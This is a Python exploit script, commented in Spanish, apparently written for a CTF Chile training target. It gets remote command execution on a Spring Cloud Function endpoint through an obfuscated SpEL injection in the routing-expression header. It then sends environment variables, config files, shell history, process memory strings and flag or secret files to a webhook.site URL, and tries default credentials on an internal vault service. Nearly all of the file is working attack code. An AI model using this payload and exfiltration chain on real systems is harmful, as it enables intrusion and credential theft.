#!/usr/bin/env python3
"""
CTF Chile - Búsqueda alternativa: variables de entorno, credenciales y más
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("[*] Búsqueda alternativa de flags...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: https://webhook.site/#!/{UUID}")
print()

def build_payload(cmd):
    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    payload = build_payload(cmd)
    try:
        r = requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": payload,
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )
        print(f"    [+] {tag:35s} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag}: {e}")

# === BÚSQUEDAS ESPECÍFICAS ===
print("[*] 1. Variables de entorno (pueden contener flags)...")
probe("env_all", "env | base64 -w0 | xargs -I X curl -s '%s/env?d=X'" % WH)
probe("env_flag", "env | grep -i flag | base64 -w0 | xargs -I X curl -s '%s/env_flag?d=X'" % WH)
probe("env_ctf", "env | grep -i ctf | base64 -w0 | xargs -I X curl -s '%s/env_ctf?d=X'" % WH)
probe("env_secret", "env | grep -i secret | base64 -w0 | xargs -I X curl -s '%s/env_secret?d=X'" % WH)

print("[*] 2. Archivos de configuración de Spring Boot...")
probe("app_props", "find /app -name '*.properties' -exec cat {} \\; 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/app_props?d=X'" % WH)
probe("app_yml", "find /app -name '*.yml' -o -name '*.yaml' -exec cat {} \\; 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/app_yml?d=X'" % WH)
probe("app_json", "find /app -name '*.json' -exec cat {} \\; 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/app_json?d=X'" % WH)

print("[*] 3. Logs de la aplicación...")
probe("app_logs", "find /app -name '*.log' -exec tail -20 {} \\; 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/app_logs?d=X'" % WH)
probe("var_logs", "ls -la /var/log/ 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/var_logs?d=X'" % WH)

print("[*] 4. Archivos ocultos y temporales...")
probe("hidden_files", "find /app -name '.*' -type f 2>/dev/null | head -10 | xargs cat 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/hidden?d=X'" % WH)
probe("tmp_files", "find /tmp -type f 2>/dev/null | head -10 | xargs cat 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/tmp?d=X'" % WH)

print("[*] 5. Historial de comandos...")
probe("bash_history", "cat ~/.bash_history 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/history?d=X'" % WH)
probe("zsh_history", "cat ~/.zsh_history 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/zsh_hist?d=X'" % WH)

print("[*] 6. Proceso de Spring Boot - memoria y argumentos...")
probe("java_processes", "ps aux | grep java | base64 -w0 | xargs -I X curl -s '%s/java_ps?d=X'" % WH)
probe("cmdline", "cat /proc/*/cmdline 2>/dev/null | strings | grep -i spring | base64 -w0 | xargs -I X curl -s '%s/cmdline?d=X'" % WH)

print("[*] 7. Intentar autenticarse en servicios internos...")
# Intentar credenciales por defecto en OmniVault
probe("vault_admin_login", "curl -s --connect-timeout 3 -X POST -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin\"}' http://10.160.209.2:8080/api/login | base64 -w0 | xargs -I X curl -s '%s/vault_login_admin?d=X'" % WH)
probe("vault_test_login", "curl -s --connect-timeout 3 -X POST -H 'Content-Type: application/json' -d '{\"username\":\"test\",\"password\":\"test\"}' http://10.160.209.2:8080/api/login | base64 -w0 | xargs -I X curl -s '%s/vault_login_test?d=X'" % WH)
probe("vault_guest_login", "curl -s --connect-timeout 3 -X POST -H 'Content-Type: application/json' -d '{\"username\":\"guest\",\"password\":\"guest\"}' http://10.160.209.2:8080/api/login | base64 -w0 | xargs -I X curl -s '%s/vault_login_guest?d=X'" % WH)

print("[*] 8. Archivos específicos del reto...")
probe("flag_anywhere", "find / -name '*flag*' -type f 2>/dev/null | head -20 | xargs cat 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/flag_files?d=X'" % WH)
probe("ctf_anywhere", "find / -name '*ctf*' -type f 2>/dev/null | head -20 | xargs cat 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/ctf_files?d=X'" % WH)
probe("secret_anywhere", "find / -name '*secret*' -type f 2>/dev/null | head -20 | xargs cat 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/secret_files?d=X'" % WH)

print("[*] 9. Base64 strings en memoria/archivos...")
probe("base64_strings", "strings /proc/*/mem 2>/dev/null | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$' | head -10 | base64 -w0 | xargs -I X curl -s '%s/b64_strings?d=X'" % WH)

print("[*] 10. JAR de Spring Boot - manifest y archivos...")
probe("jar_manifest", "cd /app && jar tf app.jar | grep -E '(flag|secret|config|properties)' | head -10 | xargs jar xf app.jar 2>/dev/null && cat flag* secret* *.properties 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/jar_content?d=X'" % WH)

print()
print("[*] Esperando 25s para recibir todas las respuestas...")
time.sleep(25)

print("[*] Revisando webhook manualmente en:")
print(f"    https://webhook.site/#!/{UUID}")
print()
print("[*] Búsqueda alternativa completada!")
print()
print("Si encuentras algo en el webhook, podemos profundizar en esa dirección.")
print("También puedes revisar:")
print("- Variables de entorno con flags")
print("- Credenciales que funcionaron en servicios internos")
print("- Archivos de configuración con información sensible")